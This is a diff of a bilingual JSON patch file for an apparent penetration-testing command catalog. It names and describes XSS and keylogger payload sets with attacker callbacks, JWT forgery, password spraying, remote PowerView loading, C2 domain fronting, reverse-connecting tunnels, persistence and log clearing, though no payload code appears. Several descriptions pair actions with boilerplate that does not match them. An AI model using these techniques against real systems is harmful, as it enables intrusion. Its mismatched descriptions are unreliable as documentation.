+      "en": "Event-attribute and tag variant dictionary covering focus and hover events, SVG/IMG/BODY load events, template literals, and keylogger samples; replace {ATTACKER_HOST} with your own callback and use only in authorized environments."
+     }
+    },
+    {
+     "path": "commands.7.description",
+     "value": {
+      "zh": "浏览器新特性 Payload：媒体事件、dialog、ES Module 与 data/blob 导入、CSS 注入与 DOM clobbering 变体，用于测试现代浏览器解析差异。",
+      "en": "Modern-browser payload dictionary covering media events, dialog, ES module and data/blob imports, CSS injection, and DOM clobbering variants for testing parser differences."
+     }
+    },
+    {
+     "path": "commands.5.name",
+     "value": {
+      "zh": "Awesome-WAF 补充",
+      "en": "Awesome-WAF Supplement"
+     }
+    },
+    {
+     "path": "commands.6.name",
+     "value": {
+      "zh": "Tricks-Web-Pentest XSS绕过技巧",
+      "en": "Tricks-Web-Pentest XSS Bypass Tricks"
+     }
+    },
+    {
+     "path": "commands.7.name",
+     "value": {
+      "zh": "Advanced-XSS 补充 (来源: Karthikdude/Advanced-XSS GitHub)",
+      "en": "Advanced-XSS Supplement"
+     }
+    }
+   ]
+  },
+  {
+   "id": "cloud-azure-pentest",
+   "patches": [
+    {
+     "path": "commands.5.description",
+     "value": {
+      "zh": "CNAME指向Azure：按 App Service、Storage、CDN 等具体 Azure 服务核对 CNAME 与资源绑定；只有官方验证后的自有测试域标记才能确认风险。",
+      "en": "CNAME to Azure: verify CNAME and resource binding per concrete Azure service such as App Service, Storage, and CDN; only an officially verified marker on an owned test domain confirms risk."
+     }
+    },
+    {
+     "path": "commands.5.name",
+     "value": {
+      "zh": "CNAME指向Azure",
+      "en": "CNAME to Azure"
+     }
+    }
+   ]
+  },
+  {
+   "id": "jwt-attacks",
+   "patches": [
+    {
+     "path": "commands.14.description",
+     "value": {
+      "zh": "用固定测试密钥本地签名 HS256 令牌并请求标记端点，验证签名校验路径；成功标准：正确签名被接受、篡改签名被拒绝，且不附加任何提权声明。",
+      "en": "Sign an HS256 token locally with a fixed test key and request the marker endpoint to verify the signature-checking path; success means the correct signature is accepted, a tampered signature is rejected, and no privilege claims are added."
+     }
+    },
+    {
+     "path": "commands.9.name",
+     "value": {
+      "zh": "对本地夹具演练公钥混淆攻击",
+      "en": "Key Confusion Attack Drill on Local Fixture"
+     }
+    },
+    {
+     "path": "commands.11.name",
+     "value": {
+      "zh": "none算法大小写变体",
+      "en": "none Algorithm Case Variants"
+     }
+    },
+    {
+     "path": "commands.14.name",
+     "value": {
+      "zh": "使用已知密钥伪造 HS256 令牌",
+      "en": "Forge HS256 Token with Known Key"
+     }
+    }
+   ]
+  },
+  {
+   "id": "password-spraying",
+   "patches": [
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "对本地登录接口用两个固定用户名配同一错误密码各发一次请求，打印状态码与响应长度，用于确认认证失败路径的响应差异；不使用代理、账号轮换或凭据存储。",
+      "en": "Send one request each for two fixed usernames with the same wrong password against the local login endpoint, printing status codes and response lengths to compare authentication-failure responses; no proxies, account rotation, or credential storage involved."
+     }
+    },
+    {
+     "path": "commands.0.description",
+     "value": {
+      "zh": "Office 365 密码喷洒",
+      "en": "Office 365 password spraying against the configured user list."
+     }
+    },
+    {
+     "path": "commands.4.name",
+     "value": {
+      "zh": "登录失败响应差分对照",
+      "en": "Login Failure Response Differential"
+     }
+    }
+   ]
+  },
+  {
+   "id": "python-pentest-scripts",
+   "patches": [
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "并发上传唯一命名标记文件并立即读取对应 URL，探测上传检查与删除之间的时间窗口；成功标准：任一读取返回 PAYLOADER_MARKER 正文即存在窗口，全部 404/403 则未命中。",
+      "en": "Upload uniquely named marker files concurrently and immediately read the corresponding URLs to probe the window between upload checks and deletion; any read returning the marker body means a window exists, while all 404 and 403 responses mean no hit."
+     }
+    },
+    {
+     "path": "commands.6.description",
+     "value": {
+      "zh": "本地生成包含 ../ 路径成员与符号链接成员的 tar.gz 夹具并回读成员清单；成功标准：getmembers 输出的 name/linkname 与写入一致，可直接用于上传解压行为测试。",
+      "en": "Generate a local tar.gz fixture containing ../ path members and symlink members and read back the member list; success means getmembers names and linknames match what was written, ready for upload-extraction behavior tests."
+     }
+    },
+    {
+     "path": "commands.4.name",
+     "value": {
+      "zh": "Python并发竞态利用脚本",
+      "en": "Python Concurrency Race Script"
+     }
+    }
+   ]
+  },
+  {
+   "id": "php-attacks",
+   "patches": [
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "在临时目录以 phar.readonly=0 生成包含 marker.txt 的 Phar 并回读内容；成功标准：第二次 php -r 回显 PAYLOADER_MARKER，脚本结束后临时目录自动清理。",
+      "en": "Generate a Phar containing marker.txt in an auto-cleaned temp directory with phar.readonly=0 and read it back; success means the second php -r echoes PAYLOADER_MARKER and the temp directory is removed on exit."
+     }
+    },
+    {
+     "path": "commands.5.description",
+     "value": {
+      "zh": "把 session.save_path 指向临时目录，写入 marker 会话后直接检查 sess_PAYLOADERMARKER 文件；成功标准：grep 命中 PAYLOADER_MARKER，用于验证会话文件命名与内容格式。",
+      "en": "Point session.save_path at a temp directory, write a marker session, and inspect the sess_PAYLOADERMARKER file directly; success means grep matches PAYLOADER_MARKER, validating session file naming and content format."
+     }
+    }
+   ]
+  },
+  {
+   "id": "cloud-security-tools",
+   "patches": [
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "CNAME指向AWS S3：核对组织 CNAME、S3 endpoint 类型、区域和 bucket 命名绑定，只有自有账户创建精确 bucket 并返回唯一标记才确认可声明性。",
+      "en": "CNAME to AWS S3: review organizational CNAME, S3 endpoint type, region, and bucket-name binding; claimability is confirmed only when an owned account creates the exact bucket and serves a unique marker."
+     }
+    },
+    {
+     "path": "commands.5.description",
+     "value": {
+      "zh": "CNAME指向CloudFront：核对 CNAME、distribution 与 alternate domain name/证书归属，只有自有测试 distribution 成功添加精确别名并返回标记才确认风险。",
+      "en": "CNAME to CloudFront: review CNAME, distribution, alternate domain name, and certificate ownership; risk is confirmed only when an owned test distribution adds the exact alias and returns a marker."
+     }
+    },
+    {
+     "path": "commands.4.name",
+     "value": {
+      "zh": "CNAME指向AWS S3",
+      "en": "CNAME to AWS S3"
+     }
+    },
+    {
+     "path": "commands.5.name",
+     "value": {
+      "zh": "CNAME指向CloudFront",
+      "en": "CNAME to CloudFront"
+     }
+    }
+   ]
+  },
+  {
+   "id": "web-cache-tools",
+   "patches": [
+    {
+     "path": "commands.3.description",
+     "value": {
+      "zh": "Vary header 绕过：整理常见 Vary 值用于审查响应配置与缓存键覆盖；这些响应头文本不是可直接发送的攻击载荷。",
+      "en": "Common Vary header value list for reviewing response configuration and cache-key coverage; these header strings are not directly sendable attack payloads."
+     }
+    },
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "整理 Pragma、Expires、Age 与常见 CDN 命中/服务头，用于响应分析与配置审查；这些响应头文本不是可直接发送的攻击请求。",
+      "en": "Pragma, Expires, Age, and common CDN hit and service header list for response analysis and configuration review; these header strings are not directly sendable attack requests."
+     }
+    },
+    {
+     "path": "commands.3.name",
+     "value": {
+      "zh": "Vary header 绕过",
+      "en": "Vary Header Bypass"
+     }
+    },
+    {
+     "path": "commands.4.name",
+     "value": {
+      "zh": "Pragma/Expires 与缓存命中头组合",
+      "en": "Pragma/Expires and Cache Hit Headers"
+     }
+    }
+   ]
+  },
+  {
+   "id": "web-deserialization",
+   "patches": [
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "Java反序列化：全部行是 Base64/十六进制 Java 流头或常见类名片段，没有完整 gadget 与对象图，适合作为反序列化识别工具特征而非可执行 Payload。",
+      "en": "Java deserialization signature list: every line is a Base64 or hexadecimal Java stream header or common class-name fragment without a complete gadget graph, suited as identification input rather than executable payloads."
+     }
+    },
+    {
+     "path": "commands.5.description",
+     "value": {
+      "zh": ".NET反序列化：四行是 BinaryFormatter 风格 Base64 对象流样本，用于识别 System、System.Data 与集合类型特征；不包含明确 gadget 行为，仅作识别参考。",
+      "en": ".NET deserialization sample list: four BinaryFormatter-style Base64 streams identifying System, System.Data, and collection types without a defined gadget effect, for identification reference only."
+     }
+    },
+    {
+     "path": "commands.4.name",
+     "value": {
+      "zh": "Java反序列化",
+      "en": "Java Deserialization"
+     }
+    },
+    {
+     "path": "commands.5.name",
+     "value": {
+      "zh": ".NET反序列化",
+      "en": ".NET Deserialization"
+     }
+    }
+   ]
+  },
+  {
+   "id": "threat-intel-tools",
+   "patches": [
+    {
+     "path": "commands.3.description",
+     "value": {
+      "zh": "将品牌相似的 Punycode 同形域名输入检测界面、允许列表和告警规则，验证其能否区分 Unicode 同形字符仿冒；域名可被还原为对应 Unicode 显示形式即样本有效。",
+      "en": "Brand-like Punycode homograph domains fed into detection interfaces, allowlists, and warning rules to verify Unicode confusable handling; samples are valid when the domain restores to its Unicode display form."
+     }
+    },
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "常见punycode域名示例：提供 xn-- A-label 与 Unicode 显示形式的对照，适合域名分析工具和告警界面测试，不是网络攻击载荷。",
+      "en": "Punycode examples mapping xn-- A-labels to Unicode display forms for domain-analysis tools and warning-interface tests, not network attack payloads."
+     }
+    },
+    {
+     "path": "commands.5.description",
+     "value": {
+      "zh": "IDN Homograph + 子域：整理 account、secure、mail、support 等子域与同形域组合，用于离线品牌监控规则测试。",
+      "en": "Subdomain and homograph combinations (account, secure, mail, support, and similar) for offline brand-monitoring rule tests."
+     }
+    },
+    {
+     "path": "commands.0.description",
+     "value": {
+      "zh": "VirusTotal API 查询",
+      "en": "VirusTotal API lookup for domain, IP, and file intelligence."
+     }
+    },
+    {
+     "path": "commands.2.description",
+     "value": {
+      "zh": "AlienVault OTX IOC 查询",
+      "en": "AlienVault OTX lookup for IOC indicators related to the target."
+     }
+    },
+    {
+     "path": "commands.3.name",
+     "value": {
+      "zh": "IDN 同形域名样本（西里尔字母替换）",
+      "en": "IDN Homograph Samples (Cyrillic Substitution)"
+     }
+    },
+    {
+     "path": "commands.4.name",
+     "value": {
+      "zh": "常见punycode域名示例",
+      "en": "Common Punycode Domain Examples"
+     }
+    },
+    {
+     "path": "commands.5.name",
+     "value": {
+      "zh": "IDN Homograph + 子域",
+      "en": "IDN Homograph with Subdomains"
+     }
+    }
+   ]
+  },
+  {
+   "id": "file-analysis-toolkit",
+   "patches": [
+    {
+     "path": "commands.14.description",
+     "value": {
+      "zh": "在自动清理的临时目录内创建含 PAYLOADER_MARKER 的 zip，用 unzip -Z1 列出条目名，验证归档清单读取流程。",
+      "en": "Create a ZIP containing PAYLOADER_MARKER in an auto-cleaned temp directory and list entry names with unzip -Z1 to verify the archive-listing workflow."
+     }
+    },
+    {
+     "path": "commands.15.description",
+     "value": {
+      "zh": "用 PHP Phar 对象列出 phar 归档内条目名与大小，核对清单与预期一致。",
+      "en": "Use a PHP Phar object to list entry names and sizes inside the phar archive and check the listing against expectations."
+     }
+    },
+    {
+     "path": "commands.16.description",
+     "value": {
+      "zh": "计算 phar 归档的 SHA256 哈希，用于完整性核对。",
+      "en": "Compute the SHA256 hash of the phar archive for integrity verification."
+     }
+    },
+    {
+     "path": "commands.17.description",
+     "value": {
+      "zh": "用 Python 构造带 ../outside/ 相对路径的 tar.gz 与 zip 样本，用于验证解包工具对路径穿越的处理。",
+      "en": "Build tar.gz and zip samples containing ../outside/ relative-path members with Python to verify how unpacking tools handle path traversal."
+     }
+    },
+    {
+     "path": "commands.18.description",
+     "value": {
+      "zh": "构造带 PAYLOADER_MARKER 的 PNG/BMP 样本，用 exiftool 写入并读回 Comment 元数据，验证元数据读写流程。",
+      "en": "Build PNG/BMP samples carrying PAYLOADER_MARKER, write and read back Comment metadata with exiftool to verify the metadata read-write workflow."
+     }
+    },
+    {
+     "path": "commands.1.description",
+     "value": {
+      "zh": "计算 SHA256 哈希。",
+      "en": "Compute the SHA256 hash; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    },
+    {
+     "path": "commands.3.description",
+     "value": {
+      "zh": "查看文件前 256 字节。",
+      "en": "Show the first 256 bytes as hex; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    },
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "提取可见字符串；保留输入制品的路径、哈希或解析结果，以便在不改动原件的情况下复核。",
+      "en": "Extract printable strings; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    }
+   ]
+  },
+  {
+   "id": "nmap",
+   "patches": [
+    {
+     "path": "commands.17.description",
+     "value": {
+      "zh": "对单一实验主机做主机发现（-sn 不扫端口），并用 --max-rate/--max-retries 限制发包速率与重试；输出出现 \"Host is up\" 即确认可达。",
+      "en": "Host discovery against a single lab host (-sn skips port scanning) with --max-rate and --max-retries bounding packet rate and retries; Host is up in the output confirms reachability."
+     }
+    }
+   ]
+  },
+  {
+   "id": "powersploit-tool",
+   "patches": [
+    {
+     "path": "commands.0.description",
+     "value": {
+      "zh": "远程加载PowerView",
+      "en": "Remotely load PowerView into the current PowerShell session from the given URL."
+     }
+    },
+    {
+     "path": "commands.1.description",
+     "value": {
+      "zh": "获取域信息；记录查询身份、目录范围和返回对象，只把与授权目录基线不一致的结果列为发现。",
+      "en": "Get domain information; record the query identity, directory scope, and returned objects, and treat only deviations from the authorized directory baseline as findings."
+     }
+    }
+   ]
+  },
+  {
+   "id": "whatweb",
+   "patches": [
+    {
+     "path": "commands.3.description",
+     "value": {
+      "zh": "列出或指定使用特定插件；保存请求地址、响应状态、关键响应头和输出文件，便于核对实际 HTTP 行为。",
+      "en": "List or select specific WhatWeb plugins for website identification."
+     }
+    }
+   ]
+  },
+  {
+   "id": "wafw00f",
+   "patches": [
+    {
+     "path": "commands.2.description",
+     "value": {
+      "zh": "批量检测多个URL；保存请求地址、响应状态、关键响应头和输出文件，便于核对实际 HTTP 行为。",
+      "en": "Batch-detect WAF presence and type across multiple URLs listed in a file."
+     }
+    }
+   ]
+  },
+  {
+   "id": "patator",
+   "patches": [
+    {
+     "path": "commands.1.description",
+     "value": {
+      "zh": "HTTP登录表单暴力破解",
+      "en": "Brute-force an HTTP login form with the configured username and password files, ignoring responses that contain the failure marker."
+     }
+    }
+   ]
+  },
+  {
+   "id": "frp-tunnel",
+   "patches": [
+    {
+     "path": "commands.1.description",
+     "value": {
+      "zh": "以 frps.toml 启动 FRP 服务端，在 7000 端口等待客户端连接；日志出现 frps 启动成功信息且 7000 端口处于监听即成功。",
+      "en": "Start the FRP server from frps.toml listening on port 7000 for client connections; a successful frps startup message in the log with port 7000 listening means success."
+     }
+    },
+    {
+     "path": "commands.3.description",
+     "value": {
+      "zh": "以 frpc.toml 启动 FRP 客户端，向 {FRPS_HOST}:7000 注册名为 ssh 的 TCP 代理；日志出现该代理的 start proxy success 即成功。",
+      "en": "Start the FRP client from frpc.toml to register the TCP proxy named ssh toward {FRPS_HOST}:7000; a start proxy success log line for that proxy means success."
+     }
+    }
+   ]
+  },
+  {
+   "id": "osint-tools",
+   "patches": [
+    {
+     "path": "commands.0.description",
+     "value": {
+      "zh": "Shodan 资产发现；保存请求地址、响应状态、关键响应头和输出文件，便于核对实际 HTTP 行为。",
+      "en": "Shodan asset discovery querying public intelligence for target hosts, netblocks, and domains."
+     }
+    }
+   ]
+  },
+  {
+   "id": "ssh-tunneling-advanced",
+   "patches": [
+    {
+     "path": "commands.5.description",
+     "value": {
+      "zh": "把本地 8080 经跳板机转发到目标 80 端口；curl http://127.0.0.1:8080 返回目标服务响应即成功。",
+      "en": "Forward local port 8080 through the jump host to the target port 80; curl http://127.0.0.1:8080 returning the target service response means success."
+     }
+    }
+   ]
+  },
+  {
+   "id": "interactsh",
+   "patches": [
+    {
+     "path": "commands.2.description",
+     "value": {
+      "zh": "DNS 外带数据验证；保存请求地址、响应状态、关键响应头和输出文件，便于核对实际 HTTP 行为。",
+      "en": "DNS out-of-band verification confirming the target triggered a callback through the interaction subdomain."
+     }
+    }
+   ]
+  },
+  {
+   "id": "shodan-fofa-tools",
+   "patches": [
+    {
+     "path": "commands.1.description",
+     "value": {
+      "zh": "FOFA 搜索语法；保存请求地址、响应状态、关键响应头和输出文件，便于核对实际 HTTP 行为。",
+      "en": "FOFA search syntax reference for constructing asset-retrieval queries."
+     }
+    }
+   ]
+  },
+  {
+   "id": "red-team-infrastrucutre",
+   "patches": [
+    {
+     "path": "commands.1.description",
+     "value": {
+      "zh": "C2 域前置技术；保存请求地址、响应状态、关键响应头和输出文件，便于核对实际 HTTP 行为。",
+      "en": "C2 domain fronting technique outline crafting requests with a forged Host header to observe CDN routing behavior."
+     }
+    }
+   ]
+  },
+  {
+   "id": "ngrok-tunnel",
+   "patches": [
+    {
+     "path": "commands.0.description",
+     "value": {
+      "zh": "将 {NGROK_AUTHTOKEN} 写入本地 ngrok 配置；命令无报错即成功，后续端点命令依赖此令牌。",
+      "en": "Write {NGROK_AUTHTOKEN} into the local ngrok config; no command error means success and later endpoint commands depend on this token."
+     }
+    },
+    {
+     "path": "commands.1.description",
+     "value": {
+      "zh": "为本地 80 端口创建公网 HTTP 隧道；界面 Forwarding 显示 ngrok 域名指向 http://localhost:80 即成功。",
+      "en": "Create a public HTTP tunnel for local port 80; the dashboard Forwarding line showing an ngrok domain pointing to http://localhost:80 means success."
+     }
+    },
+    {
+     "path": "commands.2.description",
+     "value": {
+      "zh": "用预留域名 {NGROK_DOMAIN} 暴露本地 8080（域名需先在 ngrok 后台预留）；Forwarding 行显示该预留域名即成功。",
+      "en": "Expose local port 8080 on the reserved domain {NGROK_DOMAIN} (reserve it in the ngrok dashboard first); the Forwarding line showing that domain means success."
+     }
+    },
+    {
+     "path": "commands.3.description",
+     "value": {
+      "zh": "为本地 22 端口创建公网 TCP 隧道；Forwarding 显示 tcp:// 端点指向 localhost:22 即成功。",
+      "en": "Create a public TCP tunnel for local port 22; the Forwarding line showing a tcp:// endpoint pointing to localhost:22 means success."
+     }
+    }
+   ]
+  },
+  {
+   "id": "venom-tunnel",
+   "patches": [
+    {
+     "path": "commands.0.description",
+     "value": {
+      "zh": "启动 Venom 管理端在 9999 端口监听 Agent 反向连接；9999 端口进入监听即成功。",
+      "en": "Start the Venom admin server listening on port 9999 for agent reverse connections; port 9999 entering the listening state means success."
+     }
+    },
+    {
+     "path": "commands.1.description",
+     "value": {
+      "zh": "Agent 向管理端 {ADMIN_HOST}:9999 发起反向连接；管理端节点列表出现该 Agent 即成功。",
+      "en": "Agent connects back to the admin server at {ADMIN_HOST}:9999; the agent appearing in the admin node list means success."
+     }
+    }
+   ]
+  },
+  {
+   "id": "active-directory-attacks",
+   "patches": [
+    {
+     "path": "commands.1.description",
+     "value": {
+      "zh": "AS-REP Roasting 攻击",
+      "en": "AS-REP Roasting attack requesting encrypted service-account tickets for offline cracking in the authorized domain."
+     }
+    }
+   ]
+  },
+  {
+   "id": "bloodhound-queries",
+   "patches": [
+    {
+     "path": "commands.2.description",
+     "value": {
+      "zh": "列出可 Kerberoast 的用户",
+      "en": "List Kerberoastable user accounts from BloodHound query output."
+     }
+    }
+   ]
+  },
+  {
+   "id": "impacket-advanced",
+   "patches": [
+    {
+     "path": "commands.0.description",
+     "value": {
+      "zh": "申请 Kerberos TGT 票据",
+      "en": "Request a Kerberos TGT ticket for the authorized test account."
+     }
+    }
+   ]
+  },
+  {
+   "id": "windows-pentest-advanced",
+   "patches": [
+    {
+     "path": "commands.2.description",
+     "value": {
+      "zh": "Kerberos 票据管理",
+      "en": "Kerberos ticket management operations such as listing, purging, and reapplying tickets."
+     }
+    }
+   ]
+  },
+  {
+   "id": "persistence-techniques",
+   "patches": [
+    {
+     "path": "commands.2.description",
+     "value": {
+      "zh": "Systemd 服务持久化",
+      "en": "Systemd service persistence creating a user-level unit in the authorized lab."
+     }
+    }
+   ]
+  },
+  {
+   "id": "ldeep",
+   "patches": [
+    {
+     "path": "commands.0.description",
+     "value": {
+      "zh": "枚举域用户；记录查询身份、目录范围和返回对象，只把与授权目录基线不一致的结果列为发现。",
+      "en": "Enumerate domain users; record the query identity, directory scope, and returned objects, and treat only deviations from the authorized directory baseline as findings."
+     }
+    },
+    {
+     "path": "commands.3.description",
+     "value": {
+      "zh": "查询密码策略；记录查询身份、目录范围和返回对象，只把与授权目录基线不一致的结果列为发现。",
+      "en": "Query the password policy; record the query identity, directory scope, and returned objects, and treat only deviations from the authorized directory baseline as findings."
+     }
+    }
+   ]
+  },
+  {
+   "id": "net-commands",
+   "patches": [
+    {
+     "path": "commands.0.description",
+     "value": {
+      "zh": "列出所有用户；记录查询身份、目录范围和返回对象，只把与授权目录基线不一致的结果列为发现。",
+      "en": "List all users; record the query identity, directory scope, and returned objects, and treat only deviations from the authorized directory baseline as findings."
+     }
+    },
+    {
+     "path": "commands.2.description",
+     "value": {
+      "zh": "添加新用户；记录查询身份、目录范围和返回对象，只把与授权目录基线不一致的结果列为发现。",
+      "en": "Add a new user; record the query identity, directory scope, and returned objects, and treat only deviations from the authorized directory baseline as findings."
+     }
+    },
+    {
+     "path": "commands.3.description",
+     "value": {
+      "zh": "删除用户；记录查询身份、目录范围和返回对象，只把与授权目录基线不一致的结果列为发现。",
+      "en": "Delete a user; record the query identity, directory scope, and returned objects, and treat only deviations from the authorized directory baseline as findings."
+     }
+    },
+    {
+     "path": "commands.6.description",
+     "value": {
+      "zh": "列出域用户；记录查询身份、目录范围和返回对象，只把与授权目录基线不一致的结果列为发现。",
+      "en": "List domain users; record the query identity, directory scope, and returned objects, and treat only deviations from the authorized directory baseline as findings."
+     }
+    },
+    {
+     "path": "commands.7.description",
+     "value": {
+      "zh": "列出域管理员；记录查询身份、目录范围和返回对象，只把与授权目录基线不一致的结果列为发现。",
+      "en": "List domain admins; record the query identity, directory scope, and returned objects, and treat only deviations from the authorized directory baseline as findings."
+     }
+    }
+   ]
+  },
+  {
+   "id": "powershell-pentest",
+   "patches": [
+    {
+     "path": "commands.7.description",
+     "value": {
+      "zh": "获取用户信息；记录查询身份、目录范围和返回对象，只把与授权目录基线不一致的结果列为发现。",
+      "en": "Get user information; record the query identity, directory scope, and returned objects, and treat only deviations from the authorized directory baseline as findings."
+     }
+    }
+   ]
+  },
+  {
+   "id": "windows-cmd",
+   "patches": [
+    {
+     "path": "commands.1.description",
+     "value": {
+      "zh": "用户管理命令；记录查询身份、目录范围和返回对象，只把与授权目录基线不一致的结果列为发现。",
+      "en": "User management commands; record the query identity, directory scope, and returned objects, and treat only deviations from the authorized directory baseline as findings."
+     }
+    },
+    {
+     "path": "commands.5.description",
+     "value": {
+      "zh": "文件操作命令；保留输入制品的路径、哈希或解析结果，以便在不改动原件的情况下复核。",
+      "en": "File operation commands; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    }
+   ]
+  },
+  {
+   "id": "fileless-antiforensics",
+   "patches": [
+    {
+     "path": "commands.2.description",
+     "value": {
+      "zh": "清除系统日志痕迹；保留输入制品的路径、哈希或解析结果，以便在不改动原件的情况下复核。",
+      "en": "Clear system log traces; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    }
+   ]
+  },
+  {
+   "id": "linux-privilege",
+   "patches": [
+    {
+     "path": "commands.1.description",
+     "value": {
+      "zh": "获取用户信息；保留输入制品的路径、哈希或解析结果，以便在不改动原件的情况下复核。",
+      "en": "Get user information; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    },
+    {
+     "path": "commands.6.description",
+     "value": {
+      "zh": "查看计划任务；保留输入制品的路径、哈希或解析结果，以便在不改动原件的情况下复核。",
+      "en": "View scheduled tasks; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    },
+    {
+     "path": "commands.8.description",
+     "value": {
+      "zh": "查找敏感文件；保留输入制品的路径、哈希或解析结果，以便在不改动原件的情况下复核。",
+      "en": "Find sensitive files; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    }
+   ]
+  },
+  {
+   "id": "linux-text-processing-reference",
+   "patches": [
+    {
+     "path": "commands.0.description",
+     "value": {
+      "zh": "输出小文件内容；保留输入制品的路径、哈希或解析结果，以便在不改动原件的情况下复核。",
+      "en": "Print a small file to stdout; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    },
+    {
+     "path": "commands.1.description",
+     "value": {
+      "zh": "分页查看大文件；保留输入制品的路径、哈希或解析结果，以便在不改动原件的情况下复核。",
+      "en": "Page through a large file; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    }
+   ]
+  },
+  {
+   "id": "powershell-admin-reference",
+   "patches": [
+    {
+     "path": "commands.12.description",
+     "value": {
+      "zh": "计算文件哈希；保留输入制品的路径、哈希或解析结果，以便在不改动原件的情况下复核。",
+      "en": "Calculate a file hash; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    }
+   ]
+  },
+  {
+   "id": "windows-cmd-reference",
+   "patches": [
+    {
+     "path": "commands.6.description",
+     "value": {
+      "zh": "输出文本文件内容；保留输入制品的路径、哈希或解析结果，以便在不改动原件的情况下复核。",
+      "en": "Print a text file; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    },
+    {
+     "path": "commands.11.description",
+     "value": {
+      "zh": "查看文件属性；保留输入制品的路径、哈希或解析结果，以便在不改动原件的情况下复核。",
+      "en": "Show file attributes; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    },
+    {
+     "path": "commands.12.description",
+     "value": {
+      "zh": "查看 NTFS 权限；保留输入制品的路径、哈希或解析结果，以便在不改动原件的情况下复核。",
+      "en": "Show NTFS permissions; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    },
+    {
+     "path": "commands.13.description",
+     "value": {
+      "zh": "计算文件 SHA256。",
+      "en": "Calculate a file SHA256 hash; preserve the input path, hash, or parsed findings so the artifact can be reviewed without modifying the original."
+     }
+    }
+   ]
+  },
+  {
+   "id": "web-authentication-bypass",
+   "patches": [
+    {
+     "path": "commands.6.description",
+     "value": {
+      "zh": "以三个固定 OTP 候选（两个无效值与一个批准测试值）请求验证端点并输出状态码；成功标准：无效值全部失败、批准值单次有效，服务端审计可见账户计数变化。",
+      "en": "Send three fixed OTP candidates (two invalid values and one approved test value) to the verification endpoint and print status codes; success means invalid values all fail, the approved value works once, and the server audit shows the account counter change."
+     }
+    },
+    {
+     "path": "commands.7.description",
+     "value": {
+      "zh": "逐个伪造 X-Forwarded-For 与 X-Real-IP 提交登录请求并观察状态码；成功标准：伪造头部不改变基于账户的限流键，若限流被重置则存在转发头信任缺陷。",
+      "en": "Forge X-Forwarded-For and X-Real-IP values one by one when submitting login requests and observe status codes; success means forged headers do not change the account-based rate-limit key, while a reset indicates a forwarded-header trust flaw."
+     }
+    },
+    {
+     "path": "commands.4.name",
+     "value": {
+      "zh": "HTTP 方法覆盖与路径规范化探测",
+      "en": "HTTP Method Override and Path Normalization Probe"
+     }
+    },
+    {
+     "path": "commands.5.name",
+     "value": {
+      "zh": "基于响应差异的用户名枚举",
+      "en": "Username Enumeration via Response Differences"
+     }
+    },
+    {
+     "path": "commands.9.name",
+     "value": {
+      "zh": "会话 Cookie 采样",
+      "en": "Session Cookie Sampling"
+     }
+    },
+    {
+     "path": "commands.10.name",
+     "value": {
+      "zh": "密码重置令牌采样",
+      "en": "Password Reset Token Sampling"
+     }
+    },
+    {
+     "path": "commands.11.name",
+     "value": {
+      "zh": "重置令牌限流验证",
+      "en": "Reset Token Rate-Limit Check"
+     }
+    },
+    {
+     "path": "commands.12.name",
+     "value": {
+      "zh": "SAML ACS 重放",
+      "en": "SAML ACS Replay"
+     }
+    },
+    {
+     "path": "commands.13.name",
+     "value": {
+      "zh": "2FA OTP 固定预算验证",
+      "en": "2FA OTP Fixed-Budget Check"
+     }
+    },
+    {
+     "path": "commands.14.name",
+     "value": {
+      "zh": "验证码可读性测量",
+      "en": "CAPTCHA Readability Measurement"
+     }
+    },
+    {
+     "path": "commands.15.name",
+     "value": {
+      "zh": "解码自有 Cookie 夹具",
+      "en": "Decode Owned Cookie Fixture"
+     }
+    }
+   ]
+  },
+  {
+   "id": "post-exploitation-linux",
+   "patches": [
+    {
+     "path": "commands.7.description",
+     "value": {
+      "zh": "将 xterm 窗口重定向到攻击端 X Server，验证目标可对外发起连接；攻击端需先启动 Xvfb/Xnest 并 xhost 放行，出现窗口即连通。",
+      "en": "Redirect the xterm window to the attacker-side X server to verify the target can open outbound connections; start Xvfb/Xnest and allow clients with xhost on the attacker side first, and a window appearing means connectivity."
+     }
+    }
+   ]
+  },
+  {
+   "id": "john",
+   "patches": [
+    {
+     "path": "commands.8.name",
+     "value": {
+      "zh": "JWT HS256 弱密钥字典破解",
+      "en": "JWT HS256 Weak-Key Dictionary Crack"
+     }
+    }
+   ]
+  },
+  {
+   "id": "hashcat",
+   "patches": [
+    {
+     "path": "commands.9.name",
+     "value": {
+      "zh": "JWT HS256 弱密钥字典检查",
+      "en": "JWT HS256 Weak-Key Dictionary Check"
+     }
+    }
+   ]
+  },
+  {
+   "id": "jwt-decode",
+   "patches": [
+    {
+     "path": "commands.4.name",
+     "value": {
+      "zh": "测试令牌结构检查（样例）",
+      "en": "Sample Token Structure Check"
+     }
+    }
+   ]
+  },
+  {
+   "id": "wireshark-tshark",
+   "patches": [
+    {
+     "path": "commands.6.name",
+     "value": {
+      "zh": "离线抓包 Cookie 会话关联复核",
+      "en": "Offline Capture Cookie Session Review"
+     }
+    }
+   ]
+  },
+  {
+   "id": "xxe-tools",
+   "patches": [
+    {
+     "path": "commands.4.name",
+     "value": {
+      "zh": "SAML 绑定编码（POST/Redirect）",
